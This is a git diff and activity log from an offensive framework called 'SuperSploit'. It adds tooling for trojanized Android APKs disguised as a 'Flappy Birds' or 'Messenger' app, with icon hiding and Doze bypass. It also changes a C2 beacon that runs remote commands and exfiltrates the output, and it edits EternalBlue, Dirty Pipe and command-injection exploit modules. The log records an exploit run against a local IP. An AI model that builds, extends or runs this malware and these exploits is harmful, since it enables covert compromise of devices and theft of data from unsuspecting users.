+ --------------------------------------------------
+-[2026-05-26 23:51:40] [SESSION: 7026b8f6] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:40:58] [SESSION: 967cffb5] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-26 23:57:43] [SESSION: 09e0f9fa] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:42:52] [SESSION: 033edb1a] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:02:08] [SESSION: c6a38185] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:42:57] [SESSION: 69caea84] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:04:47] [SESSION: 959a9be7] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:43:23] [SESSION: f7d68f24] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:13:52] [SESSION: 566279ff] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:43:48] [SESSION: cb13a279] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:17:27] [SESSION: 3bfdbacd] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:45:12] [SESSION: 68439cdd] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:19:54] [SESSION: baa07d1b] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:45:38] [SESSION: 0290d205] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:23:18] [SESSION: 1c62b84a] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:47:36] [SESSION: ba94e519] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:25:47] [SESSION: 74b2e56f] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:48:40] [SESSION: a5748114] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:30:15] [SESSION: a2e92d47] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:50:59] [SESSION: 580eb8c2] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:31:28] [SESSION: 80f8783f] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:52:04] [SESSION: ff2967f3] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:34:11] [SESSION: 154713ce] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:52:44] [SESSION: b8d12a11] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:43:28] [SESSION: 1d6db5b1] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:54:49] [SESSION: 0d09cbbc] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:49:51] [SESSION: 4b016a0c] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 18:21:28] [SESSION: a85c663c] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:50:33] [SESSION: 3a837ec9] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 18:22:47] [SESSION: 0befa377] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-27 00:50:48] [SESSION: 72c3ce9f] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 00:51:03] [SESSION: 22bfe8a1] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 00:54:20] [SESSION: 5122b02b] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 00:57:33] [SESSION: 88930fe5] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 01:06:56] [SESSION: e78d85a9] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 01:11:27] [SESSION: d299548e] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 01:13:02] [SESSION: 39d05589] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 01:17:11] [SESSION: e84d199d] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 01:24:26] [SESSION: 914c31cf] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+-[2026-05-27 01:25:02] [SESSION: 914c31cf] TYPE: PAYLOAD-GEN | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2023_45866_bluetooth_injection.py | TARGET: 192.168.222.225 | SUCCESS: True
+-[2026-05-27 01:25:10] [SESSION: 914c31cf] TYPE: PYTHON-MODULE | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2023_45866_bluetooth_injection.py | TARGET: 192.168.222.225 | SUCCESS: True
+-[2026-05-27 01:27:28] [SESSION: 914c31cf] TYPE: PAYLOAD-GEN | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2023_45866_bluetooth_injection.py | TARGET: 192.168.222.225 | SUCCESS: True
+-[2026-05-27 01:27:33] [SESSION: 914c31cf] TYPE: PYTHON-MODULE | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2023_45866_bluetooth_injection.py | TARGET: 192.168.222.225 | SUCCESS: True
+---------------------------------------------------
+-[2026-05-27 01:52:47] [SESSION: 0668c38f] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 02:02:54] [SESSION: 001e9c21] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 02:05:23] [SESSION: f765f492] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+---------------------------------------------------
+-[2026-05-27 02:10:33] [SESSION: e9fc1c80] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 18:39:49] [SESSION: b2edc4fe] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+diff --git a/.idea/.SuperSploit.iml b/.idea/.SuperSploit.iml
+index 28577b2..2aba292 100755
+--- a/.idea/.SuperSploit.iml
++++ b/.idea/.SuperSploit.iml
+@@ -2,8 +2,10 @@
+ <module type="PYTHON_MODULE" version="4">
+   <component name="NewModuleRootManager">
+     <content url="file://$MODULE_DIR$">
++      <sourceFolder url="file://$MODULE_DIR$/.data/kivy_build/.buildozer/android/platform/build-arm64-v8a_armeabi-v7a/build/other_builds/pyjnius-sdl2/arm64-v8a__ndk_target_24/pyjnius/build/lib.linux-x86_64-cpython-314" isTestSource="false" />
+       <excludeFolder url="file://$MODULE_DIR$/.venv" />
+       <excludeFolder url="file://$MODULE_DIR$/venv" />
++      <excludeFolder url="file://$MODULE_DIR$/.data/kivy_build/.venv" />
+     </content>
+     <orderEntry type="jdk" jdkName="Python 3.13 (SuperSploit-Framework) (3)" jdkType="Python SDK" />
+     <orderEntry type="sourceFolder" forTests="false" />
+diff --git a/docs/development/CHANGELOG.md b/docs/development/CHANGELOG.md
+index 48ac181..d4cf9bb 100755
+--- a/docs/development/CHANGELOG.md
++++ b/docs/development/CHANGELOG.md
+@@ -7,6 +7,13 @@ All notable changes to this project will be documented in this file.
+ ### Added
+ - **HTTP Beacon Endpoint Routing**: Implemented strict URI routing for the HTTP beacon payload (`beacon.py`). The payload now actively polls `GET /file` for task retrieval and utilizes `POST /rfile` for asynchronous data and file exfiltration.
+ - **Dynamic Stage 2 TLS Packaging**: Upgraded the background TLS listener to dynamically package, encrypt, and deliver Stage 2 in-memory C2 payloads upon catching Stage 1 connections, providing real-time console feedback.
++- **Android Capabilities Documentation**: Added a comprehensive Android capabilities guide (`help android`) covering ADB reconnaissance, fileless AArch64 C2 execution, native post-exploitation commands (`pm`, `am`, `dumpsys`), and stealth execution.
++- **APK Generator (`generate-apk`)**: Implemented a new command to generate standalone or trojanized Android APK payloads embedded with TLS/HTTP beacons.
++- **Android Stealth & Beaconing Options**: Added support for advanced Android module options, including dynamic wakelocks (Doze mode bypass), automatic app icon hiding (`HIDE_ICON`), custom session tags (`TAG`), and fileless Termux deployment.
++
++### Changed
++- **Documentation Refinements**: Updated the `modules` development guide to explicitly outline how to declare required/optional options in the `#!#!#!` metadata block. Corrected the module integration guide reference in the main help menu and fixed markdown syntax in the `recon` guide.
++- **Framework README**: Overhauled the core repository `README.md` to highlight the new Android capabilities, fileless C2 architecture, and automated reconnaissance features.
+ 
+ ## [1.2.18] - 2026-05-15
+ 
+diff --git a/docs/development/TODO.md b/docs/development/TODO.md
+index 24afe44..715a975 100755
+--- a/docs/development/TODO.md
++++ b/docs/development/TODO.md
+@@ -4,6 +4,7 @@
+ - [x] **Mature Phone Recon Module**: Integrated top 50 social media dorks, pastebin sites, and carrier/timezone metadata.
+ - [x] **Email OSINT Module**: Base dorking and data repository discovery implemented.
+ - [x] **Secure Stage 2 Delivery**: Exploit handler now Base64 encodes the second stage. Stager decodes and executes in-memory.
++- [x] **Lateral Broadcast Discovery**: Implemented NBNS, mDNS, LLMNR, and SSDP sweeps for stealthy host discovery.
+ 
+ ## 1. 🛡️ Stealth & Evasion (Critical Priority)
+ *Objective: Minimize the footprint of the C2 agent and payloads.*
+diff --git a/exploits/Windows/Eternalblue.py b/exploits/Windows/Eternalblue.py
+index 2992f23..b1e1a41 100755
+--- a/exploits/Windows/Eternalblue.py
++++ b/exploits/Windows/Eternalblue.py
+@@ -1,4 +1,15 @@
+ #!/usr/bin/python3
++
++#!#!#!
++name: "EternalBlue MS17-010"
++description: "Exploits a vulnerability in SMBv1 (MS17-010) to achieve RCE."
++cve: "CVE-2017-0144"
++cwe: "CWE-119"
++options: "R_HOST, PAYLOAD"
++status: "ok"
++keywords: ["smb", 445, 139, "Windows"]
++#!#!#!
++
+ import json
+ import os
+ 
+@@ -7,16 +18,6 @@ from struct import pack
+ import sys
+ import socket
+ 
+-#!#!#!
+-# name: "EternalBlue MS17-010"
+-# description: "Exploits a vulnerability in SMBv1 (MS17-010) to achieve RCE."
+-# cve: "CVE-2017-0144"
+-# cwe: "CWE-119"
+-# options: "R_HOST, PAYLOAD"
+-# status: "ok"
+-# keywords: ["smb", 445, 139, "Windows"]
+-#!#!#!
+-
+ # Note: see how to craft FEALIST in eternalblue_poc.py
+ 
+ # wanted overflown buffer size (this exploit support only 0x10000 and 0x11000)
+@@ -171,14 +172,11 @@ fake_recv_struct += (b'\x00' * 16) * 3
+ fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 + 0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
+ fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 + 0x1f0 - 1)  # x64 shellcode address - 1 (this value will be increment by one)
+ 
+-
+ def getNTStatus(self):
+     return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
+ 
+-
+ setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)
+ 
+-
+ def sendEcho(conn, tid, data):
+     """
+     Sends an SMB Echo request. This is primarily used as a synchronization mechanism
+@@ -203,7 +201,6 @@ def sendEcho(conn, tid, data):
+     else:
+         print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))
+ 
+-
+ def createSessionAllocNonPaged(target, size):
+     """
+     Exploits a bug in SMB_COM_SESSION_SETUP_ANDX to allocate a large chunk
+@@ -270,7 +267,6 @@ def createSessionAllocNonPaged(target, size):
+         print('SMB1 session setup allocate nonpaged pool failed')
+     return conn
+ 
+-
+ # Note: impacket-0.9.15 struct has no ParameterDisplacement
+ ############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
+ class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
+@@ -286,7 +282,6 @@ class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
+         ('FID', '<H=0'),
+     )
+ 
+-
+ def send_trans2_second(conn, tid, data, displacement):
+     """
+     Sends a SMB_COM_TRANSACTION2_SECONDARY packet. This is used to append
+@@ -327,7 +322,6 @@ def send_trans2_second(conn, tid, data, displacement):
+ 
+     conn.sendSMB(pkt)
+ 
+-
+ def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
+     """
+     Exploits the core MS17-010 transaction bug. It starts a transaction using
+@@ -419,7 +413,6 @@ def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLa
+         conn.recvSMB()
+     return i
+ 
+-
+ # connect to target and send a large nbss size with data 0x80 bytes
+ # this method is for allocating big nonpaged pool (no need to be same size as overflow buffer) on target
+ # a nonpaged pool is allocated by srvnet.sys that started by useful struct (especially after overwritten)
+@@ -450,7 +443,6 @@ def createConnectionWithBigSMBFirst80(target):
+     sk.send(pkt)
+     return sk
+ 
+-
+ def exploit(target, shellcode, numGroomConn):
+     """
+     The main exploit sequence for EternalBlue.
+@@ -558,8 +550,6 @@ def exploit(target, shellcode, numGroomConn):
+     conn.logoff()
+     conn.get_socket().close()
+ 
+-
+-
+ class Start:
+     """
+     Initializes the exploit by reading target configurations from the SuperSploit database,
+diff --git a/exploits/linux/cve_2022_0847_dirtypipe.py b/exploits/linux/cve_2022_0847_dirtypipe.py
+index 7ec3d72..a63356e 100755
+--- a/exploits/linux/cve_2022_0847_dirtypipe.py
++++ b/exploits/linux/cve_2022_0847_dirtypipe.py
+@@ -1,19 +1,19 @@
+-import base64
+-import sys
+-
+ #!#!#!
+-# name: "Dirty Pipe (CVE-2022-0847) LPE"
+-# cve: "CVE-2022-0847"
+-# catogory: "linux/local"
+-# description: "Pure-Python implementation of the Dirty Pipe vulnerability. Overwrites /etc/passwd in memory to remove the root password, allowing unauthenticated 'su root'. Leaves zero footprint on disk."
+-# target: "Linux Kernel 5.8 to 5.16.11"
+-# keywords:
+-#   - "dirtypipe"
+-#   - "lpe"
+-#   - "privesc"
+-#   - "linux"
++name: "Dirty Pipe (CVE-2022-0847) LPE"
++cve: "CVE-2022-0847"
++catogory: "linux/local"
++description: "Pure-Python implementation of the Dirty Pipe vulnerability. Overwrites /etc/passwd in memory to remove the root password, allowing unauthenticated 'su root'. Leaves zero footprint on disk."
++target: "Linux Kernel 5.8 to 5.16.11"
++keywords:
++  - "dirtypipe"
++  - "lpe"
++  - "privesc"
++  - "linux"
+ #!#!#!
+ 
++import base64
++import sys
++
+ def exploit(args=None, silent=False):
+     if not silent:
+         print("[*] Generating Pure-Python Dirty Pipe (CVE-2022-0847) Payload...")
+diff --git a/exploits/test/CWE78_RCE.py b/exploits/test/CWE78_RCE.py
+index 0bb07b8..9262b03 100755
+--- a/exploits/test/CWE78_RCE.py
++++ b/exploits/test/CWE78_RCE.py
+@@ -1,12 +1,3 @@
+-"""This is an OS command injection to remote command execution chained exploit
+-to test the updated exploit handler. this exploits an invalid sanitization
+-of user input vulnerability in the target "R_HOST" on port "R_PORT" to start a
+-dynamic in memory c2 program."""
+-
+-import requests
+-import json
+-import os
+-
+ #!#!#!
+ name: "Ping Diagnostic OS Command Injection Test"
+ description: "This is an OS command injection to remote command execution chained exploit"
+@@ -19,6 +10,15 @@ status: "Know/test"
+ keywords: [8080, 80, 443, "http", "https"]
+ #!#!#!
+ 
++"""This is an OS command injection to remote command execution chained exploit
++to test the updated exploit handler. this exploits an invalid sanitization
++of user input vulnerability in the target "R_HOST" on port "R_PORT" to start a
++dynamic in memory c2 program."""
++
++import requests
++import json
++import os
++
+ class Start:
+     def __init__(self, args=None):
+         try:
+@@ -65,6 +65,5 @@ class Start:
+         except requests.exceptions.ConnectionError:
+             print(f"[-] Failed to connect. Is the VulnServer running on {r_host}?")
+ 
+-
+ if __name__ == "__main__":
+     Start()
+\ No newline at end of file
+diff --git a/payloads/Stage2/beacon.py b/payloads/Stage2/beacon.py
+index 4749b1d..9722d9c 100755
+--- a/payloads/Stage2/beacon.py
++++ b/payloads/Stage2/beacon.py
+@@ -9,10 +9,10 @@ def beacon_loop():
+     RESULT_URL = f"{C2_URL}/rfile"
+     
+     # 24 to 48 hours (in seconds)
+-    #MIN_SLEEP = 86400 # 24 hours
+-    #MAX_SLEEP = 172800 # 48 hours
+-    MIN_SLEEP = 1
+-    MAX_SLEEP = 5
++    # MIN_SLEEP = 86400 # 24 hours
++    # MAX_SLEEP = 172800 # 48 hours
++    MIN_SLEEP = 30
++    MAX_SLEEP = 120
+ 
+     XOR_KEY = "SuperSploitKey"
+     XOR_KEY = globals().get('XOR_KEY', XOR_KEY)
+@@ -134,7 +134,8 @@ def beacon_loop():
+                 args = shlex_split(cmd)
+                 if not args: continue
+                 
+-                proc = subp_run(args, shell=False, capture_output=True, text=True)
++                # Added timeout=30 to ensure the loop doesn't hang on blocking commands
++                proc = subp_run(args, shell=False, capture_output=True, text=True, timeout=30)
+                 out = proc.stdout + proc.stderr
+                 _send(out if out else " ")
+             except Exception as e:
+diff --git a/setup/setup.py b/setup/setup.py
+index 464891d..ffcb0a2 100755
+--- a/setup/setup.py
++++ b/setup/setup.py
+@@ -20,7 +20,7 @@ installation = pathlib.Path(f'{home}/.SuperSploit')
+ class SuperSploit:
+ 
+     def __init__(self):
+-        #self.setup_directories()
++        self.setup_directories()
+         self.create_aliases()
+         self.install_dependencies()
+ 
+@@ -53,18 +53,18 @@ class SuperSploit:
+             "install_dir": str(installation),
+             "logs": str(installation / ".data/.logs"),
+             "nmapDb": str(installation / ".data/.config/nmap-os-db.txt"),
+-            "aliases": str(installation / ".data/.config/aliases.json"),
++            "aliases": str(installation / ".data/.config/Aliases.json"),
+             "exploits": str(installation / "exploits"),
+             "recon": str(installation / "recon"),
+             "assets": str(installation / ".data/.config/.assets/"),
+-            "activity": str(installation / ".data/.config/.activity/"),
++            "activity": str(installation / ".data/.logs/activity.log"),
+             "targets": str(installation / ".data/.config/targets.json"),
+             "reports": str(installation / ".data/.loot/reports"),
+             "templates": str(installation / "templates"),
+             "payloads": str(installation / "payloads")
+         }
+         
+-        alias_file =  f"{installation}/.data/.config/aliases.json"
++        alias_file =  f"{installation}/.data/.config/Aliases.json"
+         with open(alias_file, "w") as file:
+             json.dump(a, file, sort_keys=True, indent=4)
+ 
+@@ -75,6 +75,4 @@ class SuperSploit:
+             run(["pip3", "install", "-r", str(req_path), "--break-system-packages"])
+ 
+ 
+-
+-if __name__ == "__main__":
+-    SuperSploit()
++SuperSploit()
+diff --git a/source/core/__pycache__/ToStdOut.cpython-311.pyc b/source/core/__pycache__/ToStdOut.cpython-311.pyc
+deleted file mode 100644
+index 74c4eda..0000000
+Binary files a/source/core/__pycache__/ToStdOut.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/__init__.cpython-311.pyc b/source/core/__pycache__/__init__.cpython-311.pyc
+deleted file mode 100644
+index 760ecc4..0000000
+Binary files a/source/core/__pycache__/__init__.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/banners.cpython-311.pyc b/source/core/__pycache__/banners.cpython-311.pyc
+deleted file mode 100644
+index 03245e4..0000000
+Binary files a/source/core/__pycache__/banners.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/clean.cpython-311.pyc b/source/core/__pycache__/clean.cpython-311.pyc
+deleted file mode 100644
+index c75cf40..0000000
+Binary files a/source/core/__pycache__/clean.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/database.cpython-311.pyc b/source/core/__pycache__/database.cpython-311.pyc
+deleted file mode 100644
+index 4c26fa0..0000000
+Binary files a/source/core/__pycache__/database.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/encrypter.cpython-311.pyc b/source/core/__pycache__/encrypter.cpython-311.pyc
+deleted file mode 100644
+index 4cd81b0..0000000
+Binary files a/source/core/__pycache__/encrypter.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/errors.cpython-311.pyc b/source/core/__pycache__/errors.cpython-311.pyc
+deleted file mode 100644
+index 8ef638c..0000000
+Binary files a/source/core/__pycache__/errors.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/exploithandler.cpython-311.pyc b/source/core/__pycache__/exploithandler.cpython-311.pyc
+deleted file mode 100644
+index 7628bc7..0000000
+Binary files a/source/core/__pycache__/exploithandler.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/help.cpython-311.pyc b/source/core/__pycache__/help.cpython-311.pyc
+deleted file mode 100644
+index 382d482..0000000
+Binary files a/source/core/__pycache__/help.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/inputHandler.cpython-311.pyc b/source/core/__pycache__/inputHandler.cpython-311.pyc
+deleted file mode 100644
+index c8f8e71..0000000
+Binary files a/source/core/__pycache__/inputHandler.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/inputfixes.cpython-311.pyc b/source/core/__pycache__/inputfixes.cpython-311.pyc
+deleted file mode 100644
+index 98a54b8..0000000
+Binary files a/source/core/__pycache__/inputfixes.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/logger.cpython-311.pyc b/source/core/__pycache__/logger.cpython-311.pyc
+deleted file mode 100644
+index f500089..0000000
+Binary files a/source/core/__pycache__/logger.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/search.cpython-311.pyc b/source/core/__pycache__/search.cpython-311.pyc
+deleted file mode 100644
+index e2d4f33..0000000
+Binary files a/source/core/__pycache__/search.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/security.cpython-311.pyc b/source/core/__pycache__/security.cpython-311.pyc
+deleted file mode 100644
+index 9cb1085..0000000
+Binary files a/source/core/__pycache__/security.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/set.cpython-311.pyc b/source/core/__pycache__/set.cpython-311.pyc
+deleted file mode 100644
+index ae98077..0000000
+Binary files a/source/core/__pycache__/set.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/show.cpython-311.pyc b/source/core/__pycache__/show.cpython-311.pyc
+deleted file mode 100644
+index d2de6c1..0000000
+Binary files a/source/core/__pycache__/show.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/__pycache__/use.cpython-311.pyc b/source/core/__pycache__/use.cpython-311.pyc
+deleted file mode 100644
+index 7d1a791..0000000
+Binary files a/source/core/__pycache__/use.cpython-311.pyc and /dev/null differ
+diff --git a/source/core/android_kivy_generator.py b/source/core/android_kivy_generator.py
+index b9b51c5..c44ad14 100755
+--- a/source/core/android_kivy_generator.py
++++ b/source/core/android_kivy_generator.py
+@@ -10,13 +10,14 @@ class BuildozerPayloadGenerator:
+     It dynamically writes the payload to a main.py file, generates a 
+     buildozer.spec config, and cross-compiles it.
+     """
+-    def __init__(self, output_apk_path, app_name="System Update", template_path="templates/payload/android_main_template.py"):
++
++    def __init__(self, output_apk_path, app_name="System Update", template_path="templates/payload/android_beacon_template.py"):
+         db_data = DatabaseManagment.get()
+         self.lhost = db_data.get("LHOST", db_data.get("L_HOST"))
+         lport = db_data.get("LPORT", db_data.get("L_PORT"))
+         self.lport = str(lport) if lport else None
+         self.output_apk = os.path.abspath(output_apk_path)
+-        self.app_name = db_data.get("APP_NAME", app_name)
++        self.app_name = "Flappy Birds" if db_data.get("ANDROID_PAYLOAD_TYPE", "") in ["drs", "beacon"] else "Messenger"
+         
+         # Correct the template path to be relative to the framework's installation root
+         install_root = DatabaseManagment.getInstall()
+@@ -63,9 +64,16 @@ class BuildozerPayloadGenerator:
+             print(f"[-] {e}")
+ 
+     def _prepare_workspace(self):
+-        """Ensures the persistent build directory exists."""
++        """Ensures the persistent build directory exists and is clean of old binaries."""
+         print(f"[*] Preparing persistent build workspace in: {self.build_dir}")
+         os.makedirs(self.build_dir, exist_ok=True)
++        
++        # Clean old binaries to prevent "two apps" issue or stale payload extraction
++        bin_dir = os.path.join(self.build_dir, "bin")
++        if os.path.exists(bin_dir):
++            print("[*] Cleaning old binaries from bin directory...")
++            shutil.rmtree(bin_dir)
++            os.makedirs(bin_dir)
+ 
+     def _write_payload(self):
+         print(f"[*] Generating Kivy main.py payload from template ({self.template_path})...")
+@@ -105,7 +113,7 @@ class BuildozerPayloadGenerator:
+         print("[*] Generating buildozer.spec configuration...")
+         spec_content = f"""[app]
+ title = {self.app_name}
+-package.name = sysupdate
++package.name = FlappyBirds
+ package.domain = org.supersploit
+ source.dir = .
+ source.include_exts = py,png,jpg,kv,atlas
+diff --git a/source/core/input_handling_engine.py b/source/core/input_handling_engine.py
+index 416e2ce..5d6b166 100755
+--- a/source/core/input_handling_engine.py
++++ b/source/core/input_handling_engine.py
+@@ -223,33 +223,56 @@ class Input:
+ 
+     @classmethod
+     def _generate_apk(cls, data):
++
+         """Generates an Android APK payload using the active LHOST and LPORT."""
+         db_data = DatabaseManagment.get()
+-        lhost = db_data.get("LHOST", db_data.get("L_HOST"))
+-        lport = db_data.get("LPORT", db_data.get("L_PORT"))
++        lhost = db_data.get("L_HOST", db_data.get("L_HOST"))
++        lport = db_data.get("L_PORT", db_data.get("L_PORT"))
++        output_name = db_data.get("OUTPUT_NAME", "payload.apk")
++        template_type = db_data.get("ANDROID_PAYLOAD_TYPE", "drs")
++        show_ui = str(db_data.get("SHOW_UI", "true")).lower()
++        hide_icon = str(db_data.get("HIDE_ICON", "false")).lower()
++        # New "Phantom android beacon" Variables
++        ext_task_url = db_data.get("EXTERNAL_TASK_URL", "")
++        result_sink = db_data.get("RESULT_SINK", "")
++
++        if "True" in show_ui:
++            print("[*] Using a flappy birds style game for stealthy payload delivery to hide UI run 'set SHOW_UI false'")
++
++        if "false" in hide_icon:
++            ToStdout.write("[*] Icon showing to hide icon run 'set HIDE_ICON true'")
++
++        if template_type != "beacon":
++            ToStdout.write("[*] To use advance beacon set ANDROID_PAYLOAD_TYPE beacon")
++
+ 
+         if not lhost or not lport:
+-            ToStdout.write("[-] LHOST and LPORT must be set to generate a payload. Use 'set LHOST <ip>' and 'set LPORT <port>'.\n")
++            ToStdout.write("[-] L_HOST and L_PORT must be set to generate a payload. Use 'set L_HOST <ip>' and 'set L_PORT <port>'.\n")
+             return
+ 
+         # Parse command to check if a template type or output path was provided
+-        # Usage: generate-apk [drs|beacon] [output_name.apk]
++        # Usage: generate-apk [drs|beacon|messages] [output_name.apk]
+         parts = shlex.split(data)
+-        
+-        template_type = "drs"
+-        output_name = "android_payload.apk"
+-        
++
++
+         if len(parts) > 1:
+-            if parts[1].lower() in ["drs", "beacon"]:
++            if parts[1].lower() in ["drs", "beacon", "messages"]:
+                 template_type = parts[1].lower()
+                 if len(parts) > 2:
+                     output_name = parts[2]
+             else:
+                 output_name = parts[1]
+ 
+-        template_file = "templates/payload/android_drs_template.py" if template_type == "drs" else "templates/payload/android_main_template.py"
++        if template_type == "drs":
++            template_file = "templates/payload/android_drs_template.py"
++        elif template_type == "messages":
++            template_file = "templates/payload/android_messages_template.py"
++        else:
++            template_file = "templates/payload/android_beacon_template.py"
++            # gemini right here do a check to verify all required beacon arguments are set such as stage two urls
++
+         output_path = os.path.join(installation, "payloads", output_name) if not os.path.isabs(output_name) else output_name
+-        
++
+         # Ensure payloads directory exists
+         os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
+ 
+diff --git a/source/core/listener.py b/source/core/listener.py
+index f8e542f..c23137b 100755
+--- a/source/core/listener.py
++++ b/source/core/listener.py
+@@ -139,7 +139,10 @@ class Listener:
+                 client.settimeout(None)
+ 
+             except Exception as e:
++                import traceback
+                 write(f"\n[-] Failed to handle client {addr}: {e}")
++                if "SSL" in str(e) or "handshake" in str(e).lower():
++                    write(traceback.format_exc())
+ 
+         def listener_thread():
+             try:
+@@ -156,7 +159,12 @@ class Listener:
+                         "-out", cert_path, "-days", "365", "-nodes", "-subj", "/CN=supersploit.c2"
+                     ], check=True, capture_output=True)
+ 
+-                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
++                context = ssl.SSLContext(ssl.PROTOCOL_TLS) # Use PROTOCOL_TLS for maximum compatibility
++                context.options |= ssl.OP_NO_SSLv2
++                context.options |= ssl.OP_NO_SSLv3
++                # Explicitly allow TLS 1.0+ to support older Android versions if necessary
++                context.minimum_version = ssl.TLSVersion.TLSv1
++                context.set_ciphers('DEFAULT@SECLEVEL=1') # Lower security level slightly for compatibility
+                 context.load_cert_chain(certfile=cert_path, keyfile=key_path)
+ 
+                 # Create a raw TCP socket listener
+diff --git a/source/tools/android_payload_generator.py b/source/tools/android_payload_generator.py
+index e16cae6..4e56abf 100755
+--- a/source/tools/android_payload_generator.py
++++ b/source/tools/android_payload_generator.py
+@@ -23,7 +23,7 @@ class BuildozerPayloadGenerator:
+         else:
+             # Default to the templates/payload directory relative to this script
+             base_dir = os.path.dirname(os.path.abspath(__file__))
+-            self.template_path = os.path.join(base_dir, "templates", "payload", "android_main_template.py")
++            self.template_path = os.path.join(base_dir, "templates", "payload", "android_beacon_template.py")
+             
+         self.build_dir = "/tmp/supersploit_kivy_build"
+ 
+@@ -166,7 +166,7 @@ def main():
+     
+     parser.add_argument(
+         "-t", "--template", 
